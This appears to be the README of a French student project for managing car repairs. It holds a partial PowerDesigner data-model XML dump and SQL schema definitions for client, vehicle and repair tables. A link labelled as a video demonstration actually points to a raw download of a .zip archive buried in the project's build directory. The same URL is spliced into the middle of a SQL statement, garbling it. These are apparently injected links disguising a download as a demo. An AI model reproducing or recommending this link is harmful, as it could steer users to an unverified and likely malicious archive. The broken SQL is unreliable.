LABLFont color=0, 0, 0
AutoAdjustToText=Yes
Keep aspect=No
Keep center=No
Keep size=No
Width=4800
Height=3000
Brush color=208 208 255
Fill Color=Yes
Brush style=6
Brush bitmap mode=12
Brush gradient mode=65
Brush gradient color=255 255 255
Brush background image=
Custom shape=
Custom text mode=0
Pen=1 0 128 128 255
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\LINK]
ROLEFont=Arial,8,N
ROLEFont color=0, 0, 0
CARDFont=Arial,8,N
CARDFont color=0, 0, 0
Line style=2
Pen=1 0 128 128 255
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\CDMINHR]
DISPNAMEFont=Arial,8,N
DISPNAMEFont color=0 0 0
AutoAdjustToText=No
Keep aspect=No
Keep center=No
Keep size=Yes
Width=1575
Height=1000
Brush color=233 202 131
Fill Color=Yes
Brush style=6
Brush bitmap mode=12
Brush gradient mode=65
Brush gradient color=255 255 255
Brush background image=
Custom shape=
Custom text mode=0
Pen=1 0 128 0 0
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\LINH]
Line style=2
Pen=1 0 128 0 0
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\USRDEPD]
OBJXSTRFont=Arial,8,N
OBJXSTRFont color=0 0 0
Line style=2
AutoAdjustToText=Yes
Keep aspect=No
Keep center=No
Keep size=No
Brush color=255 255 255
Fill Color=Yes
Brush style=1
Brush bitmap mode=12
Brush gradient mode=0
Brush gradient color=118 118 118
Brush background image=
Custom shape=
Custom text mode=0
Pen=2 0 128 0 64
Shadow color=192 192 192
Shadow=0

[DisplayPreferences\Symbol\Free Symbol]
Free TextFont=Arial,8,N
Free TextFont color=0 0 0
Line style=2
AutoAdjustToText=Yes
Keep aspect=No
Keep center=No
Keep size=No
Brush color=255 255 255
Fill Color=Yes
Brush style=1
Brush bitmap mode=12
Brush gradient mode=0
Brush gradient color=118 118 118
Brush background image=
Custom shape=
Custom text mode=0
Pen=1 0 128 0 0
Shadow color=192 192 192
Shadow=0</a:DisplayPreferences>
<a:PaperSize>(8267, 11692)</a:PaperSize>
<a:PageMargins>((315,354), (433,354))</a:PageMargins>
<a:PageOrientation>1</a:PageOrientation>
<a:PaperSource>15</a:PaperSource>
<c:Symbols>
<o:AssociationLinkSymbol Id="o6">
<a:CreationDate>1763038386</a:CreationDate>
<a:ModificationDate>1763039085</a:ModificationDate>
<a:Rect>((-11241,-355), (-418,2059))</a:Rect>
<a:ListOfPoints>((-11241,885),(-7283,885),(-7283,-355),(-418,-355))</a:ListOfPoints>
<a:CornerStyle>2</a:CornerStyle>
<a:ArrowStyle>0</a:ArrowStyle>
<a:LineColor>16744576</a:LineColor>
<a:ShadowColor>12632256</a:ShadowColor>
<a:FontList>ROLE 0 Arial,8,N
CARD 0 Arial,8,N</a:FontList>
<c:SourceSymbol>
<o:EntitySymbol Ref="o7"/>
</c:SourceSymbol>
<c:DestinationSymbol>
<o:AssociationSymbol Ref="o8"/>
</c:DestinationSymbol>
<c:Object>
<o:AssociationLink Ref="o9"/>
</c:Object>
</o:AssociationLinkSymbol>
<o:AssociationLinkSymbol Id="o10">
<a:CreationDate>1763038386</a:CreationDate>
<a:ModificationDate>1763039085</a:ModificationDate>
<a:Rect>((-418,-1257), (10097,325))</a:Rect>
<a:ListOfPoints>((10097,325),(6270,325),(6270,-1257),(-418,-1257))</a:ListOfPoints>
<a:CornerStyle>2</a:CornerStyle>
<a:ArrowStyle>0</a:ArrowStyle>
<a:LineColor>16744576</a:LineColor>
<a:ShadowColor>12632256</a:ShadowColor>
<a:FontList>ROLE 0 Arial,8,N
CARD 0 Arial,8,N</a:FontList>
<c:SourceSymbol>
<o:EntitySymbol Ref="o11"/>
</c:SourceSymbol>
<c:DestinationSymbol>
<o:AssociationSymbol Ref="o8"/>
</c:DestinationSymbol>
<c:Object>
<o:AssociationLink Ref="o12"/>
</c:Object>
</o:AssociationLinkSymbol>
<o:EntitySymbol Id="o11">
<a:CreationDate>1762966568</a:CreationDate>
<a:ModificationDate>1763039000</a:ModificationDate>
<a:IconMode>-1</a:IconMode>
<a:Rect>((7807,-2258), (19109,4483))</a:Rect>
<a:AutoAdjustToText>0</a:AutoAdjustToText>
<a:LineColor>4227200</a:LineColor>
<a:FillColor>8637161</a:FillColor>
<a:ShadowColor>12632256</a:ShadowColor>
<a:FontList>STRN 0 Arial,8,N
DISPNAME 0 Arial,8,N
Attributes 0 Arial,8,N
LABL 0 Arial,8,N
EntityPrimaryAttribute 0 Arial,8,U
Identifiers 0 Arial,8,N</a:FontList>
<a:BrushStyle>6</a:BrushStyle>
<a:GradientFillMode>65</a:GradientFillMode>
<a:GradientEndColor>16777215</a:GradientEndColor>
<a:KeepAspect>1</a:KeepAspect>
<a:KeepCenter>1</a:KeepCenter>
<a:KeepSize>1</a:KeepSize>
<c:Object>
<o:Entity Ref="o13"/>
</c:Object>
</o:EntitySymbol>
<o:EntitySymbol Id="o7">
<a:CreationDate>1762966647</a:CreationDate>
<a:ModificationDate>1763039003</a:ModificationDate>
<a:IconMode>-1</a:IconMode>
<a:Rect>((-20766,-1734), (-9002,4034))</a:Rect>
<a:AutoAdjustToText>0</a:AutoAdjustToText>
<a:LineColor>4227200</a:LineColor>
<a:FillColor>8637161</a:FillColor>
<a:ShadowColor>12632256</a:ShadowColor>
<a:FontList>STRN 0 Arial,8,N
DISPNAME 0 Arial,8,N
Attributes 0 Arial,8,N
LABL 0 Arial,8,N
EntityPrimaryAttribute 0 Arial,8,U
Identifiers 0 Arial,8,N</a:FontList>
<a:BrushStyle>6</a:BrushStyle>
<a:GradientFillMode>65</a:GradientFillMode>
<a:GradientEndColor>16777215</a:GradientEndColor>
<a:KeepAspect>1</a:KeepAspect>
<a:KeepCenter>1</a:KeepCenter>
<a:KeepSize>1</a:KeepSize>
<c:Object>
<o:Entity Ref="o14"/>
</c:Object>
</o:EntitySymbol>
<o:AssociationSymbol Id="o8">
<a:CreationDate>1763038386</a:CreationDate>
<a:ModificationDate>1763039085</a:ModificationDate>
<a:Rect>((-5565,-4920), (4733,2918))</a:Rect>
<a:AutoAdjustToText>0</a:AutoAdjustToText>
<a:LineColor>16744576</a:LineColor>
<a:FillColor>16765136</a:FillColor>
<a:ShadowColor>12632256</a:ShadowColor>
<a:FontList>STRN 0 Arial,8,N
DISPNAME 0 Arial,8,N
Attributes 0 Arial,8,N
LABL 0 Arial,8,N</a:FontList>
<a:BrushStyle>6</a:BrushStyle>
<a:GradientFillMode>65</a:GradientFillMode>
<a:GradientEndColor>16777215</a:GradientEndColor>
<a:ManuallyResized>1</a:ManuallyResized>
<c:Object>
<o:Association Ref="o15"/>
</c:Object>
</o:AssociationSymbol>
</c:Symbols>
</o:ConceptualDiagram>
</c:ConceptualDiagrams>
<c:DefaultDiagram>
<o:ConceptualDiagram Ref="o5"/>
</c:DefaultDiagram>
<c:Entities>
<o:Entity Id="o13">
<a:ObjectID>B23A7399-4B63-44A4-814D-2FDA5C3FBBD5</a:ObjectID>
<a:Name>client</a:Name>
<a:Code>CLIENT</a:Code>
<a:CreationDate>1762966568</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966977</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:Identifiers>
<o:Identifier Id="o16">
<a:ObjectID>0BDA285B-B984-4645-87DF-8849C39C85EC</a:ObjectID>
<a:Name>id_client</a:Name>
<a:Code>ID_CLIENT</a:Code>
<a:CreationDate>1762966568</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763040046</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:Identifier.Attributes>
<o:EntityAttribute Ref="o17"/>
</c:Identifier.Attributes>
</o:Identifier>
</c:Identifiers>
<c:PrimaryIdentifier>
<o:Identifier Ref="o16"/>
</c:PrimaryIdentifier>
<c:Attributes>
<o:EntityAttribute Id="o17">
<a:ObjectID>C54CFAB9-FAFF-497A-90F5-B0E893C8E7DF</a:ObjectID>
<a:CreationDate>1762966568</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966568</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:BaseAttribute.Mandatory>1</a:BaseAttribute.Mandatory>
<c:DataItem>
<o:DataItem Ref="o18"/>
</c:DataItem>
</o:EntityAttribute>
<o:EntityAttribute Id="o19">
<a:ObjectID>7A284F83-C0D2-441C-B090-A86661F444B5</a:ObjectID>
<a:CreationDate>1762966568</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966568</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:DataItem>
<o:DataItem Ref="o20"/>
</c:DataItem>
</o:EntityAttribute>
<o:EntityAttribute Id="o21">
<a:ObjectID>00F042D5-1292-4AF7-B422-E2A4236CFFE7</a:ObjectID>
<a:CreationDate>1762966568</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966568</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:DataItem>
<o:DataItem Ref="o22"/>
</c:DataItem>
</o:EntityAttribute>
<o:EntityAttribute Id="o23">
<a:ObjectID>238FFD28-5258-4667-844A-DED7244A02C8</a:ObjectID>
<a:CreationDate>1762966568</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966568</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:DataItem>
<o:DataItem Ref="o24"/>
</c:DataItem>
</o:EntityAttribute>
</c:Attributes>
</o:Entity>
<o:Entity Id="o14">
<a:ObjectID>6C0D2D0D-94A4-44DE-8F60-3F5D38AC33EF</a:ObjectID>
<a:Name>vehicule</a:Name>
<a:Code>VEHICULE</a:Code>
<a:CreationDate>1762966647</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763039969</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:Identifiers>
<o:Identifier Id="o25">
<a:ObjectID>D46EF844-7835-4F08-9A98-BCF20EDFD05B</a:ObjectID>
<a:Name>immatricule</a:Name>
<a:Code>IMMATRICULE</a:Code>
<a:CreationDate>1762966647</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763040092</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:Identifier.Attributes>
<o:EntityAttribute Ref="o26"/>
</c:Identifier.Attributes>
</o:Identifier>
</c:Identifiers>
<c:PrimaryIdentifier>
<o:Identifier Ref="o25"/>
</c:PrimaryIdentifier>
<c:Attributes>
<o:EntityAttribute Id="o27">
<a:ObjectID>605FDDEE-F8CB-48F5-947C-C7F54A632DAD</a:ObjectID>
<a:CreationDate>1762966647</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966647</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:DataItem>
<o:DataItem Ref="o28"/>
</c:DataItem>
</o:EntityAttribute>
<o:EntityAttribute Id="o29">
<a:ObjectID>715B25E7-F897-415A-8F5C-49115FAB3BA8</a:ObjectID>
<a:CreationDate>1762966647</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966647</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:DataItem>
<o:DataItem Ref="o30"/>
</c:DataItem>
</o:EntityAttribute>
<o:EntityAttribute Id="o26">
<a:ObjectID>DC4BD898-775E-49FE-8B59-DC357D266B35</a:ObjectID>
<a:CreationDate>1763039957</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763040092</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:BaseAttribute.Mandatory>1</a:BaseAttribute.Mandatory>
<c:DataItem>
<o:DataItem Ref="o31"/>
</c:DataItem>
</o:EntityAttribute>
</c:Attributes>
</o:Entity>
</c:Entities>
<c:DataItems>
<o:DataItem Id="o18">
<a:ObjectID>C8171F8C-A1A9-41A4-8E47-C0C9A45F588C</a:ObjectID>
<a:Name>id_client</a:Name>
<a:Code>ID_CLIENT</a:Code>
<a:CreationDate>1762966568</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763039918</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>I</a:DataType>
</o:DataItem>
<o:DataItem Id="o28">
<a:ObjectID>AE6FD4D8-EC4A-4935-B46F-D88AFB630E80</a:ObjectID>
<a:Name>marque</a:Name>
<a:Code>MARQUE</a:Code>
<a:CreationDate>1762966197</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763039617</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>TXT30</a:DataType>
<a:Length>30</a:Length>
</o:DataItem>
<o:DataItem Id="o30">
<a:ObjectID>D18CF33A-B559-4EFB-8D4C-CC23C7E08A46</a:ObjectID>
<a:Name>modele</a:Name>
<a:Code>MODELE</a:Code>
<a:CreationDate>1762966197</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763039617</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>TXT30</a:DataType>
<a:Length>30</a:Length>
</o:DataItem>
<o:DataItem Id="o20">
<a:ObjectID>244DF167-91D5-4EB7-A4F3-7E6A73FBDBAF</a:ObjectID>
<a:Name>nom</a:Name>
<a:Code>NOM</a:Code>
<a:CreationDate>1762966316</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966474</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>TXT</a:DataType>
</o:DataItem>
<o:DataItem Id="o22">
<a:ObjectID>F6FCF544-761E-49D5-AAC1-700BC6217478</a:ObjectID>
<a:Name>prenom</a:Name>
<a:Code>PRENOM</a:Code>
<a:CreationDate>1762966316</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966474</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>TXT</a:DataType>
</o:DataItem>
<o:DataItem Id="o24">
<a:ObjectID>AEE2EF29-65AF-4D3D-84F6-A04002CC4721</a:ObjectID>
<a:Name>telephone</a:Name>
<a:Code>TELEPHONE</a:Code>
<a:CreationDate>1762966316</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1762966474</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>TXT</a:DataType>
</o:DataItem>
<o:DataItem Id="o32">
<a:ObjectID>8901BA23-FB55-4FD9-BCA7-718546D19C13</a:ObjectID>
<a:Name>date</a:Name>
<a:Code>DATE</a:Code>
<a:CreationDate>1762966693</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763038976</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>D</a:DataType>
</o:DataItem>
<o:DataItem Id="o33">
<a:ObjectID>E9DC4849-D838-4201-9757-CAF7E9E2EE12</a:ObjectID>
<a:Name>type</a:Name>
<a:Code>TYPE</a:Code>
<a:CreationDate>1762966693</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763038976</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>TXT30</a:DataType>
<a:Length>30</a:Length>
</o:DataItem>
<o:DataItem Id="o34">
<a:ObjectID>8AB89A19-2B2B-429F-A190-4087174CCC40</a:ObjectID>
<a:Name>cout</a:Name>
<a:Code>COUT</a:Code>
<a:CreationDate>1762966693</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763038976</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>F30</a:DataType>
<a:Length>30</a:Length>
</o:DataItem>
<o:DataItem Id="o35">
<a:ObjectID>7AFF88AE-C6D1-4AB9-974F-FBC995A6415C</a:ObjectID>
<a:Name>id_reparation</a:Name>
<a:Code>ID_REPARATION</a:Code>
<a:CreationDate>1763038397</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763038976</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>I</a:DataType>
</o:DataItem>
<o:DataItem Id="o31">
<a:ObjectID>8486928B-6416-4CFF-A621-DF93EE314AA4</a:ObjectID>
<a:Name>immatricule</a:Name>
<a:Code>IMMATRICULE</a:Code>
<a:CreationDate>1763039957</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763039992</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:DataType>TXT30</a:DataType>
<a:Length>30</a:Length>
</o:DataItem>
</c:DataItems>
<c:Associations>
<o:Association Id="o15">
<a:ObjectID>233A465F-FEED-428F-A862-550207C82E21</a:ObjectID>
<a:Name>reaparer</a:Name>
<a:Code>REAPARER</a:Code>
<a:CreationDate>1763038386</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763038976</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:Attributes>
<o:AssociationAttribute Id="o36">
<a:ObjectID>9F5F5AFE-EF5E-445E-A724-CE137860DBAD</a:ObjectID>
<a:CreationDate>1763038397</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763038976</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:DataItem>
<o:DataItem Ref="o33"/>
</c:DataItem>
</o:AssociationAttribute>
<o:AssociationAttribute Id="o37">
<a:ObjectID>47A2DE56-9AF6-422D-ABF0-9E1DCC6E837F</a:ObjectID>
<a:CreationDate>1763038397</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763038976</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:DataItem>
<o:DataItem Ref="o34"/>
</c:DataItem>
</o:AssociationAttribute>
<o:AssociationAttribute Id="o38">
<a:ObjectID>7179F8E9-CCB5-47A5-9B70-CA7E879B2B78</a:ObjectID>
<a:CreationDate>1763038397</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763038976</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<c:DataItem>
<o:DataItem Ref="o32"/>
</c:DataItem>
</o:AssociationAttribute>
<o:AssociationAttribute Id="o39">
<a:ObjectID>70BFD7E4-5B30-4737-A2DA-47EED0BEBF43</a:ObjectID>
<a:CreationDate>1763038397</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763280811</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:BaseAttribute.Mandatory>1</a:BaseAttribute.Mandatory>
<c:DataItem>
<o:DataItem Ref="o35"/>
</c:DataItem>
</o:AssociationAttribute>
</c:Attributes>
</o:Association>
</c:Associations>
<c:AssociationsLinks>
<o:AssociationLink Id="o9">
<a:ObjectID>17EEA9C1-0C72-449D-A7CF-D5C19BDE1595</a:ObjectID>
<a:CreationDate>1763038386</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763039066</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:Cardinality>1,n</a:Cardinality>
<c:Object1>
<o:Association Ref="o15"/>
</c:Object1>
<c:Object2>
<o:Entity Ref="o14"/>
</c:Object2>
</o:AssociationLink>
<o:AssociationLink Id="o12">
<a:ObjectID>ADF74885-B74B-46EA-A274-87B09257785A</a:ObjectID>
<a:CreationDate>1763038386</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763222543</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:Cardinality>1,n</a:Cardinality>
<c:Object1>
<o:Association Ref="o15"/>
</c:Object1>
<c:Object2>
<o:Entity Ref="o13"/>
</c:Object2>
</o:AssociationLink>
</c:AssociationsLinks>
<c:TargetModels>
<o:TargetModel Id="o40">
<a:ObjectID>D2FE3F10-FFE7-4BDE-9BF4-41469F6AA080</a:ObjectID>
<a:Name>Atelier_auto</a:Name>
<a:Code>ATELIER_AUTO</a:Code>
<a:CreationDate>1763040342</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763040430</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:TargetModelURL>file:///C|/Users/X1 YOGA/Desktop/3annee/Merise_atelier_auto/Atelier_auto.mld</a:TargetModelURL>
<a:TargetModelID>AE6B9916-1C1E-4989-B862-BDC3B7912904</a:TargetModelID>
<a:TargetModelClassID>5F45F978-C4F3-4E35-A3FC-AF3318663A0F</a:TargetModelClassID>
<c:SessionShortcuts>
<o:Shortcut Ref="o3"/>
</c:SessionShortcuts>
</o:TargetModel>
<o:TargetModel Id="o41">
<a:ObjectID>A120C315-7151-4AED-B5AF-1CC54B0F81E7</a:ObjectID>
<a:Name>Atelier_auto</a:Name>
<a:Code>ATELIER_AUTO</a:Code>
<a:CreationDate>1763280652</a:CreationDate>
<a:Creator>X1 YOGA</a:Creator>
<a:ModificationDate>1763417007</a:ModificationDate>
<a:Modifier>X1 YOGA</a:Modifier>
<a:TargetModelURL>file:///C|/Users/X1 YOGA/Desktop/3annee/Merise_atelier_auto/Atelier_auto.mld</a:TargetModelURL>
<a:TargetModelID>964F4985-3FEA-490E-9329-A5D187FEDF9F</a:TargetModelID>
<a:TargetModelClassID>5F45F978-C4F3-4E35-A3FC-AF3318663A0F</a:TargetModelClassID>
<c:SessionShortcuts>
<o:Shortcut Ref="o4"/>
</c:SessionShortcuts>
</o:TargetModel>
</c:TargetModels>
</o:Model>
</c:Children>
</o:RootObject>

</Model>…]()


## Démonstration vidéo

Une vidéo montrant l’utilisation de l’application peut être incluse ici :
[Regarder la démonstration vidéo]


https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1



## Base de donnees 
``` SQL
#Créer la base de données
CREATE DATABASE IF NOT EXISTS atelier_reparation;
USE atelier_reparation;

#Table: client
CREATE TABLE IF NOT EXISTS client (
  id_client INT(11) NOT NULL AUTO_INCREMENT,
  nom VARCHAR(50) NOT NULL,
  prenom VARCHAR(50) NOT NULL,
  telephone VARCHAR(50) NOT NULL,
  PRIMARY KEY (id_client)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

#Table: utilisateur
CREATE TABLE IF NOT EXISTS utilisateur (
  id INT(11) NOT NULL AUTO_INCREMENT,
  nom VARCHAR(50),
  prenom VARCHAR(50),
  email VARCHAR(100) NOT NULL,
  password VARCHAR(255) NOT NULL,
  date_creation TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY email (email)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

#Table: vehicule
CREATE TABLE IF NOT EXISTS vehicule (
  immatricule VARCHAR(50) NOT NULL,
  marque VARCHAR(50) NOT NULL,
  modele VARCHAR(50) NOT NULL,
  id_client INT(11) NOT NULL,
  PRIMARY KEY (immatricule),
  KEY fk_client_owner (id_client),
  CONSTRAINT fk_client_owner FOREIGN KEY (id_client) 
    REFERENCES client (id_client) ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

# Nouvelle structure : reparation
CREATE TABLE IF NOT EXISTS reparation (
  id_client INT(11) NOT NULL,
  immatricule VARCHAR(50) NOT NULL,
  date DATE NOT NULL,
  type VARCHAR(60) NOT NULL,
  cout FLOAT NOT NULL,

  # Clé primaire composite
  PRIMARY KEY (id_client, immatricule, date),

  # Foreign keys
  CONSTRAINT fk_rep_client FOREIGN KEY (id_client) 
      REFERENCES client(id_client) ON UPDATE CASCADE,

  CONSTRAINT fk_rep_vehicule FO

https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip

REIGN KEY (immatricule) 
      REFERENCES vehicule(immatricule) ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
```

## Développeur
Salma Laouy – ENS Marrakech, 3ᵉ année Informatique
Projet académique : gestion de réparations de véhicules

## Encadrant
Pr. Mohamed LACHGAR – Professeur en informatique
